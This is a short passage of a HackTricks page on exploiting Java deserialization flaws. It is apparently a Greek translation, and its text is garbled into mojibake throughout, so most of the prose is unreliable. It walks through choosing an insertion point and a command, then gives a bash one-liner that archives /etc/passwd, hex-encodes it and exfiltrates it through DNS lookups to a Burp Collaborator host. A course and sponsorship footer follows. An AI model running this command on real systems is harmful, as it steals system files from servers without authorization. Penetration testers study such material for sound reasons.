Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎºÎ±ÏÏ„Î­Î»Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **ÎµÏ€Î¹Î»Î­Î¾ÎµÏ„Îµ** Î¾Î±Î½Î¬ Ï„Î¿ **ÏƒÎ·Î¼ÎµÎ¯Î¿ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î®Ï‚**, Î½Î± **Î³ÏÎ¬ÏˆÎµÏ„Îµ** Ï„Î· **ÎµÏ…Î¬Î»Ï‰Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·** Î³Î¹Î± Ï„Î·Î½ Î¿Ï€Î¿Î¯Î± Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± payload, ÎºÎ±Î¹ Ï„Î·Î½ **ÎµÎ½Ï„Î¿Î»Î®**. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î±Ï€Î»ÏÏ‚ Ï€Î±Ï„Î®ÏƒÏ„Îµ Ï„Î¿ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î¿ ÎºÎ¿Ï…Î¼Ï€Î¯ **Î•Ï€Î¯Î¸ÎµÏƒÎ·Ï‚**.

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/4.png)

### Java Deserialization DNS Exfil Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

ÎšÎ¬Î½Ï„Îµ Ï„Î¿ payload ÏƒÎ±Ï‚ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½ Ï„Î¿ ÎµÎ¾Î®Ï‚:
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

* [https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
